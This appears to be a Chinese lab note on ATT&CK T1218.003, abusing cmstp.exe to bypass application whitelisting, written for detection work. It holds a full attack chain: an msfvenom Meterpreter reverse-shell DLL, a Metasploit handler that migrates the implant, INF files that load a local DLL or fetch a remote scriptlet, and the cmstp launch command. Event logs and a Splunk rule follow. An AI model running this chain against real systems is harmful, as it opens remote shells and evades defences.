# T1218-003-win-基于白名单Cmstp.exe执行Payload

## 来自ATT&CK的描述

微软的命令行程序CMSTP.exe用于安装连接管理器服务配置文件。CMSTP.exe将收到的安装信息文件（INF）作为参数，安装用于远程访问连接的服务配置文件。

攻击者可能会向CMSTP.exe提供带恶意命令的INF文件。与Regsvr32/"Squiblydoo"类似，CMSTP.exe可能被滥用来从远程服务器加载和执行动态链接库和/或COM脚本小程序。攻击者还可能用CMSTP.exe来绕过AppLocker及其他白名单防御，因为CMSTP.exe本身是一个合法的、已签名的微软应用。

CMSTP.exe也可能被滥用来绕过用户账号控制并通过自动升级的COM接口执行INF文件中的任意恶意命令。

## 测试案例

Cmstp安装或删除“连接管理器”服务配置文件。如果不含可选参数的情况下使用，则 cmstp 会使用对应于操作系统和用户的权限的默认设置来安装服务配置文件。

微软官方文档：
<https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp>

说明：Cmstp.exe所在路径已被系统添加PATH环境变量中，因此，Cmstp命令可识别，需注意x86，x64位的Cmstp调用。

Windows 2003 默认位置：

```dos
C:\Windows\System32\cmstp.exe
C:\Windows\SysWOW64\cmstp.exe
```

Windows 7 默认位置：

```dos
C:\Windows\System32\cmstp.exe
C:\Windows\SysWOW64\cmstp.exe
```

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：windows 7

### 攻击分析

#### 生成payload.dll

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=53  -f dll -o payload.dll
```

#### 执行监听

攻击机,注意配置set AutoRunScript migrate f (AutoRunScript是msf中一个强大的自动化的后渗透工具，这里migrate参数是迁移木马到其他进程)

```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.126.146
lhost => 192.168.126.146
msf5 exploit(multi/handler) > set lport 53
lport => 53
msf5 exploit(multi/handler) > set AutoRunScript migrate -f
AutoRunScript => migrate -f
msf5 exploit(multi/handler) > exploit
```

#### inf模板

```inf
    [version]
    Signature=$chicago$
    AdvancedINF=2.5
    [DefaultInstall_SingleUser]
    UnRegisterOCXs=UnRegisterOCXSection
    [UnRegisterOCXSection]
     C:\payload.dll
    [Strings]
    AppAct = "SOFTWARE\Microsoft\Connection Manager"
    ServiceName="12306Br0"
    ShortSvcName="12306Br0"
```

INF文件的RegisterOCXSection需要包含恶意DLL文件的本地路径或远程执行的WebDAV位置

#### 靶机执行payload

```cmd
cmstp.exe /ni /s C:\Users\12306Br0\Desktop\a\add.inf
```

#### 反弹shell

未成功获取到shell

## 测试留痕

```log
windows安全日志
事件ID： 4688
进程信息:
新进程 ID: 0x9b0
新进程名: C:\Windows\System32\cmstp.exe

sysmon日志
事件ID：1
OriginalFileName: CMSTP.EXE
CommandLine: cmstp.exe  /ni /s C:\Users\12306Br0\Desktop\a\add.inf
CurrentDirectory: C:\Windows\system32\
User: 12306Br0-PC\12306Br0
LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}
LogonId: 0x6e1ea
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=BA135738EF1FB2F4C2C6C610BE2C4E855A526668
ParentProcessGuid: {bb1f7c32-fdb7-5e9a-0000-0010563b2d00}
ParentProcessId: 1988
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\System32\cmd.exe"
```

## inf文件内容

```inf
    [version]
    Signature=$chicago$
    AdvancedINF=2.5
    [DefaultInstall_SingleUser]
    UnRegisterOCXs=UnRegisterOCXSection
    [UnRegisterOCXSection]
    %11%\scrobj.dll,NI,http://192.168.1.4/cmstp_rev_53_x64.sct
    [Strings]
    AppAct = "SOFTWARE\Microsoft\Connection Manager"
    ServiceName="Micropoor"
    ShortSvcName="Micropoor"
```

## 检测规则/思路

### splunk规则

```yml
index=windows source=”WinEventLog:Microsoft-Windows-Sysmon/Operational” (EventCode=1 Image=”*\\cmstp.exe”) OR (EventCode=10 SourceImage=”*\\cmstp.exe” ) OR (EventCode=10 CallTrace=”*CMLUA.dll*”) (EventCode IN (12,13) TargetObject=”*\\CMMGR32.exe” OR (EventCode=12 TargetObject=”HKLM\\SOFTWARE\\Microsoft\\Tracing\\cmstp*”)
```

### 建议

暂无

## 参考推荐

MITRE-ATT&CK-T1218-003

<https://attack.mitre.org/techniques/T1218/003/>

windows下基于白名单获取shell的方法整理（下）

<http://www.safe6.cn/article/157#directory030494471069429444>

基于白名单Cmstp.exe执行payload第十六季

<https://www.bookstack.cn/read/Micro8/Chapter1-81-90-87_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%85%AD%E5%AD%A3.md>
